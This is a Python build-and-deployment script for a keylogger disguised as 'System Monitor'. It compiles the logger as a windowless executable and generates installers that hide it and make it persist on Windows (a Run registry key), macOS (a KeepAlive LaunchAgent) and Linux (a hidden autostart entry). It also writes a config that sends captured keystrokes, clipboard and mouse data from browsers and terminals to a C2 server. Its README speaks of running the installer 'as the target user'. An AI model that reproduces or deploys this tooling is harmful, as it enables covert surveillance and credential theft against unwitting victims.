#!/usr/bin/env python3
import os
import sys
import subprocess
import argparse
import shutil
from pathlib import Path

def build_executable(script_path: str, output_name: str, icon: str = None, hidden_imports: list = None):
    cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole',
        f'--name={output_name}',
        script_path
    ]
    if icon:
        cmd.append(f'--icon={icon}')
    if hidden_imports:
        for hi in hidden_imports:
            cmd.append(f'--hidden-import={hi}')
    subprocess.run(cmd, check=True)

def create_installer(output_dir: str = 'dist'):
    installer_script = f'''@echo off
title System Monitor Installation
echo Installing System Monitor...
mkdir "%APPDATA%\\SystemMonitor" 2>nul
copy "{output_dir}\\keylogger.exe" "%APPDATA%\\SystemMonitor\\system_monitor.exe" >nul
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemMonitor" /t REG_SZ /d "\\"%APPDATA%\\SystemMonitor\\system_monitor.exe\\" --silent" /f >nul
echo Installation complete.
pause
'''
    Path('install.bat').write_text(installer_script)

def create_mac_installer(output_dir: str = 'dist'):
    installer = f'''#!/bin/bash
mkdir -p ~/Library/Application\\ Support/SystemMonitor
cp "{output_dir}/keylogger" ~/Library/Application\\ Support/SystemMonitor/system_monitor
chmod +x ~/Library/Application\\ Support/SystemMonitor/system_monitor
cat > ~/Library/LaunchAgents/com.system.monitor.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.system.monitor</string>
    <key>ProgramArguments</key><array><string>~/Library/Application Support/SystemMonitor/system_monitor</string><string>--silent</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.system.monitor.plist
echo "Installation complete."
'''
    Path('install.sh').write_text(installer)
    os.chmod('install.sh', 0o755)

def create_linux_installer(output_dir: str = 'dist'):
    installer = f'''#!/bin/bash
mkdir -p ~/.config/autostart
mkdir -p ~/.local/bin
cp "{output_dir}/keylogger" ~/.local/bin/system_monitor
chmod +x ~/.local/bin/system_monitor
cat > ~/.config/autostart/system-monitor.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Monitor
Exec=~/.local/bin/system_monitor --silent
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
echo "Installation complete."
'''
    Path('install.sh').write_text(installer)
    os.chmod('install.sh', 0o755)

def package_deployment(platform: str, c2_url: str, output_dir: str = 'deploy'):
    deploy_dir = Path(output_dir) / platform
    deploy_dir.mkdir(parents=True, exist_ok=True)
    
    if platform == 'windows':
        build_executable('core/keylogger.py', 'keylogger', hidden_imports=['pynput', 'cryptography', 'requests', 'mss'])
        shutil.copy('dist/keylogger.exe', deploy_dir / 'system_monitor.exe')
        create_installer('dist')
        shutil.copy('install.bat', deploy_dir / 'install.bat')
    elif platform == 'macos':
        build_executable('core/keylogger.py', 'keylogger', hidden_imports=['pynput', 'cryptography', 'requests', 'mss'])
        shutil.copy('dist/keylogger', deploy_dir / 'system_monitor')
        create_mac_installer('dist')
        shutil.copy('install.sh', deploy_dir / 'install.sh')
    elif platform == 'linux':
        build_executable('core/keylogger.py', 'keylogger', hidden_imports=['pynput', 'cryptography', 'requests', 'mss'])
        shutil.copy('dist/keylogger', deploy_dir / 'system_monitor')
        create_linux_installer('dist')
        shutil.copy('install.sh', deploy_dir / 'install.sh')
    
    config = {
        'c2_url': c2_url,
        'flush_interval': 30,
        'capture_mouse': True,
        'capture_clipboard': True,
        'capture_screenshots': False,
        'target_apps': ['chrome', 'firefox', 'edge', 'safari', 'terminal', 'cmd', 'powershell'],
        'exclude_apps': []
    }
    import json
    (deploy_dir / 'config.json').write_text(json.dumps(config, indent=2))
    
    readme = f'''# System Monitor Deployment Package ({platform})

## Contents
- `system_monitor.exe` / `system_monitor` - Main executable
- `install.bat` / `install.sh` - Installation script
- `config.json` - Configuration (edit C2 URL if needed)

## Installation
Run the installer as the target user:
- Windows: `install.bat` (run as admin for system-wide)
- macOS/Linux: `./install.sh`

## Configuration
Edit `config.json` to change C2 server URL and capture settings.

## Uninstall
- Windows: Delete `%APPDATA%\\SystemMonitor` and remove Run registry key
- macOS: `launchctl unload ~/Library/LaunchAgents/com.system.monitor.plist` and delete files
- Linux: Delete `~/.config/autostart/system-monitor.desktop` and `~/.local/bin/system_monitor`
'''
    (deploy_dir / 'README.md').write_text(readme)
    print(f"Deployment package created: {deploy_dir}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Build deployment packages')
    parser.add_argument('--platform', choices=['windows', 'macos', 'linux', 'all'], default='all')
    parser.add_argument('--c2', default='http://localhost:8080', help='C2 server URL')
    parser.add_argument('--output', default='deploy', help='Output directory')
    args = parser.parse_args()
    
    if args.platform == 'all':
        for plat in ['windows', 'macos', 'linux']:
            package_deployment(plat, args.c2, args.output)
    else:
        package_deployment(args.platform, args.c2, args.output)